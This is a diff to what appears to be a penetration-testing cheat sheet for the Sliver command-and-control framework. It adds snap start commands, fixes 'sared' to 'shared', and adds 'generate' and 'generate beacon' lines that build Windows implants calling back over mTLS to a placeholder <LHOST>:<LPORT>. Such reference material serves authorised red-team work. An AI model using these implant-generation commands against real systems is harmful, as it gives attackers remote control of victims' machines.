@@ -277,6 +277,13 @@ $ sliver.server
 $ sliver
 ```
 
+or
+
+```c
+$ sudo snap start sliver
+$ sudo snap run sliver
+```
+
 #### Start Sliver
 
 ```c
@@ -328,17 +335,19 @@ sliver > help generate
 sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
-sliver > generate --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
-sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 ```
 
 ### Profile Handling
